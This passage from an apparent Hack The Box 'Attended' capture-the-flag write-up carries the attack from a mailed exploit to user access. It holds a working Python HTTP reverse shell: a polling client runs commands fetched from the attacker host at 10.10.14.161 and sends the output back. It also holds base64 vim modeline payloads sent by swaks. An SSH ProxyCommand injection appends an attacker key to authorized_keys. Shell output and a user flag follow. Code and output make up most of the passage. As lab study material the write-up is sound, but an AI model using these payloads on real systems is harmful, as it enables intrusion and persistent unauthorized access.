         sf.wfile.write(remote_cmd)

if __name__ == '__main__':
   server_class = BaseHTTPServer.HTTPServer
   handler_class = request_handler
   server_addr = ("10.10.14.161", 80)
   httpd = server_class(server_addr, handler_class)
   try:
      httpd.serve_forever()
   except KeyboardInterrupt:
      httpd.server_close()
```    

On the client side we want to keep things really simple so that we do not need to send so much code to our target. The client connect back to our hacker computer and expects to get the a command to execute as a result of the HTTP/GET. I was not sure if gulys restrictions would let this pass since it´s not HTML but it worked. When a command is received it´s executed and the result is sent back to the server using a param to indicate it´s a result. This is the simplest of simple shell and not a real shell at all but it works for some simple purposes.

```python
import requests, os, base64;

while True:
    req = requests.get("http://10.10.14.161");
    command = req.text;
    if "exit" in command:
        break;
    else:
        requests.get("http://10.10.14.161", base64.b64encode(os.popen(command).read()));
```

Now lets start the server to listen for incoming connections:

```shell
┌──(root💀0037d6b5f811)-[/]
└─# python2 server.py
```

And let us prepare a a payload to once again mail over to guly. We will use a base64 encoded version of the client program above so it can easily ne transfered to the target. There it will be decoded and written to disk and finally we will execute it. It looks like this:

```shell
:!python2 -c 'import base64; print(base64.b64decode("aW1wb3J0IHJlcXVlc3RzLCBvcywgYmFzZTY0OyANCg0Kd2hpbGUgVHJ1ZTogDQogICAgcmVxID0gcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTQuMTYxIik7IA0KICAgIGNvbW1hbmQgPSByZXEudGV4dDsgDQogICAgaWYgImV4aXQiIGluIGNvbW1hbmQ6IA0KICAgICAgICBicmVhazsgDQogICAgZWxzZTogDQogICAgICAgIHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjEwLjE0LjE2MSIsIGJhc2U2NC5iNjRlbmNvZGUob3MucG9wZW4oY29tbWFuZCkucmVhZCgpKSk7"))' > client.py; python2 client.py||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

Let´s put that inside payload.txt and send it to Guly:

```shell
┌──(root💀591fd0a9b267)-[/]
└─# swaks --to guly@attended.htb --from freshness@attended.htb --body "Gonna Pwn you" --server attended.htb --attach payload.txt
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying attended.htb:25...
=== Connected to attended.htb.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO 591fd0a9b267
<-  250-proudly setup by guly for attended.htb Hello 591fd0a9b267 [10.10.14.161], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<freshness@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 22 Feb 2021 20:23:32 +0000
 -> To: guly@attended.htb
 -> From: freshness@attended.htb
 -> Subject: test Mon, 22 Feb 2021 20:23:32 +0000
 -> Message-Id: <20210222202332.000202@591fd0a9b267>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_202"
 ->
 -> ------=_MIME_BOUNDARY_000_202
 -> Content-Type: text/plain
 ->
 -> Gonna Pwn you
 -> ------=_MIME_BOUNDARY_000_202
 -> Content-Type: application/octet-stream; name="payload.txt"
 -> Content-Description: payload.txt
 -> Content-Disposition: attachment; filename="payload.txt"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> OiFweXRob24yIC1jICdpbXBvcnQgYmFzZTY0OyBwcmludChiYXNlNjQuYjY0ZGVjb2RlKCJhVzF3
 -> YjNKMElISmxjWFZsYzNSekxDQnZjeXdnWW1GelpUWTBPeUFOQ2cwS2QyaHBiR1VnVkhKMVpUb2dE
 -> UW9nSUNBZ2NtVnhJRDBnY21WeGRXVnpkSE11WjJWMEtDSm9kSFJ3T2k4dk1UQXVNVEF1TVRRdU1U
 -> WXhJaWs3SUEwS0lDQWdJR052YlcxaGJtUWdQU0J5WlhFdWRHVjRkRHNnRFFvZ0lDQWdhV1lnSW1W
 -> NGFYUWlJR2x1SUdOdmJXMWhibVE2SUEwS0lDQWdJQ0FnSUNCaWNtVmhhenNnRFFvZ0lDQWdaV3h6
 -> WlRvZ0RRb2dJQ0FnSUNBZ0lISmxjWFZsYzNSekxtZGxkQ2dpYUhSMGNEb3ZMekV3TGpFd0xqRTBM
 -> akUyTVNJc0lHSmhjMlUyTkM1aU5qUmxibU52WkdVb2IzTXVjRzl3Wlc0b1kyOXRiV0Z1WkNrdWNt
 -> VmhaQ2dwS1NrNyIpKScgPiBjbGllbnQucHk7IHB5dGhvbjIgY2xpZW50LnB5fHwiIHZpOmZlbjpm
 -> ZG09ZXhwcjpmZGU9YXNzZXJ0X2ZhaWxzKCJzb3VyY2VcIVwgXCUiKTpmZGw9MDpmZHQ9Igo=
 ->
 -> ------=_MIME_BOUNDARY_000_202--
 ->
 ->
 -> .
<-  250 2.0.0: d85a9d88 Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
```

And after some more waiting.... HALLELUHJA!!!

```shell
┌──(root💀0037d6b5f811)-[/]
└─# python2 server.py
$ whoami
guly

$ ls -la
total 64
drwxr-x---  4 guly  guly    512 Feb 22 21:07 .
drwxr-xr-x  5 root  wheel   512 Jun 26  2019 ..
-rw-r--r--  1 guly  guly     87 Apr 13  2019 .Xdefaults
-rw-r--r--  1 guly  guly    771 Apr 13  2019 .cshrc
-rw-r--r--  1 guly  guly    101 Apr 13  2019 .cvsrc
-rw-r--r--  1 guly  guly    359 Apr 13  2019 .login
-rw-r--r--  1 guly  guly    175 Apr 13  2019 .mailrc
-rw-r--r--  1 guly  guly    215 Apr 13  2019 .profile
drwx------  2 root  wheel   512 Jun 26  2019 .ssh
-rw-------  1 guly  guly      0 Dec 15 17:05 .viminfo
-rw-r-----  1 guly  guly     13 Jun 26  2019 .vimrc
-rw-r--r--  1 guly  guly    268 Feb 22 21:07 client.py
-rwxrwxrwx  1 root  guly   6789 Dec  4 09:07 gchecker.py
-rw-------  1 guly  guly      0 Feb 22 21:07 mbox
drwxr-xr-x  2 guly  guly    512 Jun 26  2019 tmp

$
```

We have av very limited shell but still a shell. Now we can start enumeration of this environment. But we have to remember that we live inside the limitations of the HTTP protocol. That means only 2048 bytes can be sent every time. You could easily evolve the reverse shell to handle this and send stuff in chunks but let´s live with this for just a while. At this time I spend a day just looking around but let´s focus on what  I found.

Let´s start with that /home/shared directory where guly promised to put a config file for freshness:

```shell
$ ls -la /home
total 20
drwxr-xr-x   5 root       wheel      512 Jun 26  2019 .
drwxr-xr-x  13 root       wheel      512 Feb 22 19:46 ..
drwxr-x---   4 freshness  freshness  512 Nov 12 16:56 freshness
drwxr-x---   4 guly       guly       512 Feb 22 21:11 guly
drwxrwx-wx   2 root       freshness  512 Dec 11 22:25 shared
```

Ok, too bad the directory belongs to freshness and we can only write stuff in there not read. Since the directory was located in home this could possibly be a user and maybe we could store something in authorized_keys but after some research I realised there was no shared user only a directory. And speaking of authorized_keys, as we could see ion the first listing we can´t even write to gulys .ssh/ so no luck there. Let´s look at that tmp catalog:

```shell
$ ls -la tmp
total 32
drwxr-xr-x  2 guly  guly    512 Jun 26  2019 .
drwxr-x---  4 guly  guly    512 Feb 22 21:26 ..
-rwxr-x---  1 guly  guly  12288 Jun 26  2019 .config.swp

$ cat tmp/.config.swp | tail -c 200
  ServerAliveInterval 60  TCPKeepAlive yes  ControlPersist 4h  ControlPath /tmp/%r@%h:%p  ControlMaster auto  User freshnessHost *
```

Inside the tmp catalog we found a swap file wich seems to be from the config file guly was talking about. After some googling of the key words we understand that this is the local config file for SSH. The part about ControlMaster and ControlPath caught my attention and this was something I did not know about earlier. You can setup your ssh so that it uses only one single tcp session for multiple connections. There´s clearly a configuration misstake here. The socket file should absolutley not be placed in /tmp for everyone to see. But I watched /tmp and there was never any socket file there and I could not come to think about a way to make freshness start a session.

So back to the config file. Since guly is sending the file to freshness via the /home/shared directory perhaps we can inject our own lines in there and hopefully freshness will execute ssh with our malicious lines. But what can be done that is harmful?

```man
ProxyCommand

Specifies the command to use to connect to the server. The SSH client communicates with the proxy command using its standard input and standard output, and the proxy command should pass the communication to an SSH server.
```

Ooops, seems like we can make freshness execute a command if we inject som evil lines inside that config file. Reverse shell or something like that seems rough since everything is so locked down. Let´s try a classic trick and inject our own public key inside freshness .ssh/autorized_keys so that we can log in on his accout via ssh. We take the configuration from the swap file and add some evil stuff.

```config
ServerAliveInterval 60
TCPKeepAlive yes
ControlPersist 4h
ControlMaster auto
ControlPath /tmp/%r@%h:%p
User freshness
Host *
ProxyCommand echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAADbAC9LsnX2YqxmfdSQtYv5TA7IYlnBb7WMOBazmixiukJvNd6VTml3bYnfzUYWTgPAcecpkzykUcdTEhzaF309r7jcAAEvj1LaPcAiXY/Uq1NOrzvhDeYpqcfR9fDqouwlQC+wcDeYetQNo7lA8yC//Zjny9DnzElQfQKeoy2Oyc32Yc0UmRS0d101CjZ+uHN2Q9ucDwdES55+1g9mpY88yofWJCO3msmFN5WSDWhXbkxPHSsynMYwYujI/GlvVtELJCTd6Bg1qnRA4x9kXwTcNKoDNQbhnvr2mwVX8a1KalyFQS2v9E4Q4zUAyaOIXohACXXx/YnfZFXfS9fcrQ95eeQZbYlL6bBjp7ZU1QPbi8m1SHnT9BAzhnFWBy1Z6taFsv3yc9vvTVz5ZxrxeAZvNWraQ77wK6noeHjql+RXQ4v0Ny5fXxrDN/R5Um/5ElHmJfMEVcYlFpYhyTZChIbMDyjez1OZ1vlJ7JqWTG1WUWRzUkLeVJrPUIKpnbEPr+S0W6YajzAY/1APB1bHaPawVPovya7Lx6CEtZRlqSG5rNIvHYMRXhtizdMXr4Z7nugkm2XTHHJoygOOql+yTSPvE1ar/aS7krkWXANcKlgcx2e7F4YTiH7YifotviYl7jWdglt0Sg8THSeALNb9c1+0vMCKZZ1BKFiVtNz2bOLbG3Pn665VknlaWkMyVC8cXY4DxkoDWcjcOiU+mjVQS2AR+aHUugsDyAwJiUdm9Fa6FgQIDGcBfT826j0S0FhZ3hLWDTPDgdg8goKwTW8gYnzeZHiHbueHeRLYoBfuvQowN7G/DZBrUivQdlEqS32QCeZWZT5s2Q47pZO+JsGDUW+RsANLHwkTYBNjartGUFt5E8EkmWFEqQqes9XVmS+WVy7znryr33s/bhW+htf2Eihx9Pml27MDU/0p1Ezvq3OYH5/oR964n1Zwd1vfAVxcS9pJu50AJvZ/UtzYqFVJa0zPbkZiSlG/Efdr6laSlQRkMhbHmw+/7/npZZeajLN9PDq4u89jXpJBgectFp9PSblBHtu0rfs/JkxStbC2UnBabBVOg95NuiCdgeZbtSSBmii5NzJ3miEuPA/MY5JXirA6YZHn/6doOT9hY+n+cA/x20xUKMssaxWdU/mFR2xmf47fdVhO0jykRxUkQqGSw== freshness@attended.htb" >> /home/freshness/.ssh/authorized_keys
```

Now we need to transfer this file to gulys account and copy it to /home/shared and then hope that freshness pick it up and try it. We base64 encode the config file and decode it on site using python2. Create the config file on gulys directory and copy it over to home shared. This is the payload:

```
:!python2 -c 'import base64; print(base64.b64decode("U2VydmVyQWxpdmVJbnRlcnZhbCA2MApUQ1BLZWVwQWxpdmUgeWVzCkNvbnRyb2xQZXJzaXN0IDRoCkNvbnRyb2xNYXN0ZXIgYXV0bwpDb250cm9sUGF0aCAvdG1wLyVyQCVoOiVwClVzZXIgZnJlc2huZXNzCkhvc3QgKgpQcm94eUNvbW1hbmQgZWNobyAic3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFEYkFDOUxzblgyWXF4bWZkU1F0WXY1VEE3SVlsbkJiN1dNT0Jhem1peGl1a0p2TmQ2VlRtbDNiWW5melVZV1RnUEFjZWNwa3p5a1VjZFRFaHphRjMwOXI3amNBQUV2ajFMYVBjQWlYWS9VcTFOT3J6dmhEZVlwcWNmUjlmRHFvdXdsUUMrd2NEZVlldFFObzdsQTh5Qy8vWmpueTlEbnpFbFFmUUtlb3kyT3ljMzJZYzBVbVJTMGQxMDFDalordUhOMlE5dWNEd2RFUzU1KzFnOW1wWTg4eW9mV0pDTzNtc21GTjVXU0RXaFhia3hQSFNzeW5NWXdZdWpJL0dsdlZ0RUxKQ1RkNkJnMXFuUkE0eDlrWHdUY05Lb0ROUWJobnZyMm13Vlg4YTFLYWx5RlFTMnY5RTRRNHpVQXlhT0lYb2hBQ1hYeC9ZbmZaRlhmUzlmY3JROTVlZVFaYllsTDZiQmpwN1pVMVFQYmk4bTFTSG5UOUJBemhuRldCeTFaNnRhRnN2M3ljOXZ2VFZ6NVp4cnhlQVp2TldyYVE3N3dLNm5vZUhqcWwrUlhRNHYwTnk1Zlh4ckROL1I1VW0vNUVsSG1KZk1FVmNZbEZwWWh5VFpDaEliTUR5amV6MU9aMXZsSjdKcVdURzFXVVdSelVrTGVWSnJQVUlLcG5iRVByK1MwVzZZYWp6QVkvMUFQQjFiSGFQYXdWUG92eWE3THg2Q0V0WlJscVNHNXJOSXZIWU1SWGh0aXpkTVhyNFo3bnVna20yWFRISEpveWdPT3FsK3lUU1B2RTFhci9hUzdrcmtXWEFOY0tsZ2N4MmU3RjRZVGlIN1lpZm90dmlZbDdqV2RnbHQwU2c4VEhTZUFMTmI5YzErMHZNQ0taWjFCS0ZpVnROejJiT0xiRzNQbjY2NVZrbmxhV2tNeVZDOGNYWTREeGtvRFdjamNPaVUrbWpWUVMyQVIrYUhVdWdzRHlBd0ppVWRtOUZhNkZnUUlER2NCZlQ4MjZqMFMwRmhaM2hMV0RUUERnZGc4Z29Ld1RXOGdZbnplWkhpSGJ1ZUhlUkxZb0JmdXZRb3dON0cvRFpCclVpdlFkbEVxUzMyUUNlWldaVDVzMlE0N3BaTytKc0dEVVcrUnNBTkxId2tUWUJOamFydEdVRnQ1RThFa21XRkVxUXFlczlYVm1TK1dWeTd6bnJ5cjMzcy9iaFcraHRmMkVpaHg5UG1sMjdNRFUvMHAxRXp2cTNPWUg1L29SOTY0bjFad2QxdmZBVnhjUzlwSnU1MEFKdlovVXR6WXFGVkphMHpQYmtaaVNsRy9FZmRyNmxhU2xRUmtNaGJIbXcrLzcvbnBaWmVhakxOOVBEcTR1ODlqWHBKQmdlY3RGcDlQU2JsQkh0dTByZnMvSmt4U3RiQzJVbkJhYkJWT2c5NU51aUNkZ2VaYnRTU0JtaWk1TnpKM21pRXVQQS9NWTVKWGlyQTZZWkhuLzZkb09UOWhZK24rY0EveDIweFVLTXNzYXhXZFUvbUZSMnhtZjQ3ZmRWaE8wanlrUnhVa1FxR1N3PT0gZnJlc2huZXNzQGF0dGVuZGVkLmh0YiIgPj4gL2hvbWUvZnJlc2huZXNzLy5zc2gvYXV0aG9yaXplZF9rZXlzCg=="))' > config; cp  config /home/shared/.||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

Let´s deliver the nastyness to guly and hopefully he will try the config file and write our public key into his own authorized keys.

```shell
┌──(root💀591fd0a9b267)-[/]
└─# swaks --to guly@attended.htb --from freshness@attended.htb --body "Gonna Pwn you" --server attended.htb --attach payload.txt
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying attended.htb:25...
=== Connected to attended.htb.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO 591fd0a9b267
<-  250-proudly setup by guly for attended.htb Hello 591fd0a9b267 [10.10.14.161], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<freshness@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 22 Feb 2021 21:34:19 +0000
 -> To: guly@attended.htb
 -> From: freshness@attended.htb
 -> Subject: test Mon, 22 Feb 2021 21:34:19 +0000
 -> Message-Id: <20210222213419.000288@591fd0a9b267>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_288"
 ->
 -> ------=_MIME_BOUNDARY_000_288
 -> Content-Type: text/plain
 ->
 -> Gonna Pwn you
 -> ------=_MIME_BOUNDARY_000_288
 -> Content-Type: application/octet-stream; name="payload.txt"
 -> Content-Description: payload.txt
 -> Content-Disposition: attachment; filename="payload.txt"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> OiFweXRob24yIC1jICdpbXBvcnQgYmFzZTY0OyBwcmludChiYXNlNjQuYjY0ZGVjb2RlKCJVMlZ5
 -> ZG1WeVFXeHBkbVZKYm5SbGNuWmhiQ0EyTUFwVVExQkxaV1Z3UVd4cGRtVWdlV1Z6Q2tOdmJuUnli
 -> MnhRWlhKemFYTjBJRFJvQ2tOdmJuUnliMnhOWVhOMFpYSWdZWFYwYndwRGIyNTBjbTlzVUdGMGFD
 -> QXZkRzF3THlWeVFDVm9PaVZ3Q2xWelpYSWdabkpsYzJodVpYTnpDa2h2YzNRZ0tncFFjbTk0ZVVO
 -> dmJXMWhibVFnWldOb2J5QWljM05vTFhKellTQkJRVUZCUWpOT2VtRkRNWGxqTWtWQlFVRkJSRUZS
 -> UVVKQlFVRkVZa0ZET1V4emJsZ3lXWEY0Yldaa1UxRjBXWFkxVkVFM1NWbHNia0ppTjFkTlQwSmhl
 -> bTFwZUdsMWEwcDJUbVEyVmxSdGJETmlXVzVtZWxWWlYxUm5VRUZqWldOd2EzcDVhMVZqWkZSRmFI
 -> cGhSak13T1hJM2FtTkJRVVYyYWpGTVlWQmpRV2xZV1M5VmNURk9UM0o2ZG1oRVpWbHdjV05tVWps
 -> bVJIRnZkWGRzVVVNcmQyTkVaVmxsZEZGT2J6ZHNRVGg1UXk4dldtcHVlVGxFYm5wRmJGRm1VVXRs
 -> YjNreVQzbGpNekpaWXpCVmJWSlRNR1F4TURGRGFsb3JkVWhPTWxFNWRXTkVkMlJGVXpVMUt6Rm5P
 -> VzF3V1RnNGVXOW1WMHBEVHpOdGMyMUdUalZYVTBSWGFGaGlhM2hRU0ZOemVXNU5XWGRaZFdwSkww
 -> ZHNkbFowUlV4S1ExUmtOa0puTVhGdVVrRTBlRGxyV0hkVVkwNUxiMFJPVVdKb2JuWnlNbTEzVmxn
 -> NFlURkxZV3g1UmxGVE1uWTVSVFJSTkhwVlFYbGhUMGxZYjJoQlExaFllQzlaYm1aYVJsaG1Vemxt
 -> WTNKUk9UVmxaVkZhWWxsc1REWmlRbXB3TjFwVk1WRlFZbWs0YlRGVFNHNVVPVUpCZW1odVJsZENl
 -> VEZhTm5SaFJuTjJNM2xqT1haMlZGWjZOVnA0Y25obFFWcDJUbGR5WVZFM04zZExObTV2WlVocWNX
 -> d3JVbGhSTkhZd1RuazFabGg0Y2tST0wxSTFWVzB2TlVWc1NHMUtaazFGVm1OWmJFWndXV2g1VkZw
 -> RGFFbGlUVVI1YW1WNk1VOWFNWFpzU2pkS2NWZFVSekZYVlZkU2VsVnJUR1ZXU25KUVZVbExjRzVp
 -> UlZCeUsxTXdWelpaWVdwNlFWa3ZNVUZRUWpGaVNHRlFZWGRXVUc5MmVXRTNUSGcyUTBWMFdsSnNj
 -> Vk5ITlhKT1NYWklXVTFTV0doMGFYcGtUVmh5TkZvM2JuVm5hMjB5V0ZSSVNFcHZlV2RQVDNGc0sz
 -> bFVVMUIyUlRGaGNpOWhVemRyY210WFdFRk9ZMHRzWjJONE1tVTNSalJaVkdsSU4xbHBabTkwZG1s
 -> WmJEZHFWMlJuYkhRd1UyYzRWRWhUWlVGTVRtSTVZekVyTUhaTlEwdGFXakZDUzBacFZuUk9lakpp
 -> VDB4aVJ6TlFialkyTlZacmJteGhWMnROZVZaRE9HTllXVFJFZUd0dlJGZGphbU5QYVZVcmJXcFdV
 -> Vk15UVZJcllVaFZkV2R6UkhsQmQwcHBWV1J0T1VaaE5rWm5VVWxFUjJOQ1psUTRNalpxTUZNd1Jt
 -> aGFNMmhNVjBSVVVFUm5aR2M0WjI5TGQxUlhPR2RaYm5wbFdraHBTR0oxWlVobFVreFpiMEptZFha
 -> UmIzZE9OMGN2UkZwQ2NsVnBkbEZrYkVWeFV6TXlVVU5sV2xkYVZEVnpNbEUwTjNCYVR5dEtjMGRF
 -> VlZjclVuTkJUa3hJZDJ0VVdVSk9hbUZ5ZEVkVlJuUTFSVGhGYTIxWFJrVnhVWEZsY3psWVZtMVRL
 -> MWRXZVRkNmJuSjVjak16Y3k5aWFGY3JhSFJtTWtWcGFIZzVVRzFzTWpkTlJGVXZNSEF4UlhwMmNU
 -> TlBXVWcxTDI5U09UWTBiakZhZDJReGRtWkJWbmhqVXpsd1NuVTFNRUZLZGxvdlZYUjZXWEZHVmtw
 -> aE1IcFFZbXRhYVZOc1J5OUZabVJ5Tm14aFUyeFJVbXROYUdKSWJYY3JMemN2Ym5CYVdtVmhha3hP
 -> T1ZCRWNUUjFPRGxxV0hCS1FtZGxZM1JHY0RsUVUySnNRa2gwZFRCeVpuTXZTbXQ0VTNSaVF6SlZi
 -> a0poWWtKV1QyYzVOVTUxYVVOa1oyVmFZblJUVTBKdGFXazFUbnBLTTIxcFJYVlFRUzlOV1RWS1dH
 -> bHlRVFpaV2todUx6WmtiMDlVT1doWksyNHJZMEV2ZURJd2VGVkxUWE56WVhoWFpGVXZiVVpTTW5o
 -> dFpqUTNabVJXYUU4d2FubHJVbmhWYTFGeFIxTjNQVDBnWm5KbGMyaHVaWE56UUdGMGRHVnVaR1Zr
 -> TG1oMFlpSWdQajRnTDJodmJXVXZabkpsYzJodVpYTnpMeTV6YzJndllYVjBhRzl5YVhwbFpGOXJa
 -> WGx6Q2c9PSIpKScgPiBjb25maWc7IGNwIGNvbmZpZyAvaG9tZS9zaGFyZWQvLnx8IiB2aTpmZW46
 -> ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK
 ->
 -> ------=_MIME_BOUNDARY_000_288--
 ->
 ->
 -> .
<-  250 2.0.0: 1ed8123b Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
```

Waiting is something we do a lot of in this phase of the hack! And here I had som problem that I never really understood. That happens  often witrh this from now on... :) The config file is copied over to guly but we still can´t log in. But hackers should never try things only once or only one way so:

```shell
$ cat config
ServerAliveInterval 60
ControlPersist 4h
ControlPath /tmp/%r@%h:%p
Host *
ProxyCommand echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAADbAC9LsnX2YqxmfdSQtYv5TA7IYlnBb7WMOBazmixiukJvNd6VTml3bYnfzUYWTgPAcecpkzykUcdTEhzaF309r7jcAAEvj1LaPcAiXY/Uq1NOrzvhDeYpqcfR9fDqouwlQC+wcDeYetQNo7lA8yC//Zjny9DnzElQfQKeoy2Oyc32Yc0UmRS0d101CjZ+uHN2Q9ucDwdES55+1g9mpY88yofWJCO3msmFN5WSDWhXbkxPHSsynMYwYujI/GlvVtELJCTd6Bg1qnRA4x9kXwTcNKoDNQbhnvr2mwVX8a1KalyFQS2v9E4Q4zUAyaOIXohACXXx/YnfZFXfS9fcrQ95eeQZbYlL6bBjp7ZU1QPbi8m1SHnT9BAzhnFWBy1Z6taFsv3yc9vvTVz5ZxrxeAZvNWraQ77wK6noeHjql+RXQ4v0Ny5fXxrDN/R5Um/5ElHmJfMEVcYlFpYhyTZChIbMDyjez1OZ1vlJ7JqWTG1WUWRzUkLeVJrPUIKpnbEPr+S0W6YajzAY/1APB1bHaPawVPovya7Lx6CEtZRlqSG5rNIvHYMRXhtizdMXr4Z7nugkm2XTHHJoygOOql+yTSPvE1ar/aS7krkWXANcKlgcx2e7F4YTiH7YifotviYl7jWdglt0Sg8THSeALNb9c1+0vMCKZZ1BKFiVtNz2bOLbG3Pn665VknlaWkMyVC8cXY4DxkoDWcjcOiU+mjVQS2AR+aHUugsDyAwJiUdm9Fa6FgQIDGcBfT826j0S0FhZ3hLWDTPDgdg8goKwTW8gYnzeZHiHbueHeRLYoBfuvQowN7G/DZBrUivQdlEqS32QCeZWZT5s2Q47pZO+JsGDUW+RsANLHwkTYBNjartGUFt5E8EkmWFEqQqes9XVmS+WVy7znryr33s/bhW+htf2Eihx9Pml27MDU/0p1Ezvq3OYH5/oR964n1Zwd1vfAVxcS9pJu50AJvZ/UtzYqFVJa0zPbkZiSlG/Efdr6laSlQRkMhbHmw+/7/npZZeajLN9PDq4u89jXpJBgectFp9PSblBHtu0rfs/JkxStbC2UnBabBVOg95NuiCdgeZbtSSBmii5NzJ3miEuPA/MY5JXirA6YZHn/6doOT9hY+n+cA/x20xUKMssaxWdU/mFR2xmf47fdVhO0jykRxUkQqGSw== freshness@attended.htb >> /home/freshness/.ssh/authorized_keys

$ cp config /home/shared/config
```

From our shell we verify that the file has been transfered to guly. We try to copy it by hand and see if this works:

```shell
┌──(root💀591fd0a9b267)-[/]
└─# ssh -i /root/.ssh/id_rsa freshness@attended.htb
Last login: Mon Feb 22 22:08:07 2021 from 10.10.14.161
OpenBSD 6.5 (GENERIC) #13: Sun May 10 23:16:59 MDT 2020

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

attended$
```

And HALLLEFKNLULJAH!!!! We are inside attended and have a stable shell!!! Let´s se what is there:

```shell
attended$ ls -la
total 52
drwxr-x---  4 freshness  freshness  512 Nov 12 16:56 .
drwxr-xr-x  5 root       wheel      512 Jun 26  2019 ..
-rw-r--r--  1 freshness  freshness   87 Jun 26  2019 .Xdefaults
-rw-r--r--  1 freshness  freshness  771 Jun 26  2019 .cshrc
-rw-r--r--  1 freshness  freshness  101 Jun 26  2019 .cvsrc
-rw-r--r--  1 freshness  freshness  359 Jun 26  2019 .login
-rw-r--r--  1 freshness  freshness  175 Jun 26  2019 .mailrc
-rw-r--r--  1 freshness  freshness  215 Jun 26  2019 .profile
drwx------  2 freshness  freshness  512 Aug  6  2019 .ssh
drwxr-x---  2 freshness  freshness  512 Nov 16 13:57 authkeys
-rw-r--r--  1 freshness  freshness  436 Feb 22 22:08 dead.letter
-rwxr-x---  1 root       freshness  422 Jun 28  2019 fchecker.py
-r--r-----  1 root       freshness   33 Jun 26  2019 user.txt
attended$ cat user.txt
b0390ad535424c0981699b93041a3ff1
```

VICTORY!!! The first part of our journey has come to an end. We can login to attended with the user freshness credentials. The user flag is located at his home directory. From here we ca start working on elevating our priveleges and become root!


## Enumeration of freshness files and directories

So now we have a stable shell via ssh. Let´s see what this dude freshness is up to.

```shell
attended$ ls -la
total 52
drwxr-x---  4 freshness  freshness  512 Nov 12 16:56 .
drwxr-xr-x  5 root       wheel      512 Jun 26  2019 ..
-rw-r--r--  1 freshness  freshness   87 Jun 26  2019 .Xdefaults
-rw-r--r--  1 freshness  freshness  771 Jun 26  2019 .cshrc
-rw-r--r--  1 freshness  freshness  101 Jun 26  2019 .cvsrc
-rw-r--r--  1 freshness  freshness  359 Jun 26  2019 .login
-rw-r--r--  1 freshness  freshness  175 Jun 26  2019 .mailrc
-rw-r--r--  1 freshness  freshness  215 Jun 26  2019 .profile
drwx------  2 freshness  freshness  512 Aug  6  2019 .ssh
drwxr-x---  2 freshness  freshness  512 Nov 16 13:57 authkeys
-rw-r--r--  1 freshness  freshness  436 Feb 22 22:08 dead.letter
-rwxr-x---  1 root       freshness  422 Jun 28  2019 fchecker.py
-r--r-----  1 root       freshness   33 Jun 26  2019 user.txt
attended$ cd authkeys/
attended$ ls -la
total 24
drwxr-x---  2 freshness  freshness   512 Nov 16 13:57 .
drwxr-x---  4 freshness  freshness   512 Nov 12 16:56 ..
-rw-r--r--  1 root       wheel      5424 Nov 16 13:35 authkeys
-rw-r-----  1 root       freshness   178 Nov  6  2019 note.txt
attended$ cat note.txt
on attended:
[ ] enable authkeys command for sshd
[x] remove source code
[ ] use nobody
on attendedgw:
[x] enable authkeys command for sshd
[x] remove source code
[ ] use nobody
attended$ file authkeys
authkeys: ELF 64-bit LSB executable, x86-64, version 1
```

Authkeys is an interesting name that caught attention. Inside that directory there were some notes that says authkeys is not enabled att attended but it´s enabled at attendedgw, the source code is removed from both places and nobody is not in use whatever that means. When we look at authkeys it´s obviously an executable file. The file is owned by root and we do not have any rights to execute it.

Let´s try to find out what authkeys is all about. Let´s see if there are any configuration files that mention it.

```shell
attended$ grep -rnw '/etc' -e 'authkeys'
grep: /etc/examples/bgpd.conf: Permission denied
grep: /etc/examples/doas.conf: Permission denied
grep: /etc/examples/dvmrpd.conf: Permission denied
grep: /etc/examples/eigrpd.conf: Permission denied
grep: /etc/examples/hostapd.conf: Permission denied
grep: /etc/examples/iked.conf: Permission denied
grep: /etc/examples/ipsec.conf: Permission denied
grep: /etc/examples/ldapd.conf: Permission denied
grep: /etc/examples/ldpd.conf: Permission denied
grep: /etc/examples/ospf6d.conf: Permission denied
grep: /etc/examples/ospfd.conf: Permission denied
grep: /etc/examples/pf.conf: Permission denied
grep: /etc/examples/radiusd.conf: Permission denied
grep: /etc/examples/rc.local: Permission denied
grep: /etc/examples/rc.securelevel: Permission denied
grep: /etc/examples/rc.shutdown: Permission denied
grep: /etc/examples/relayd.conf: Permission denied
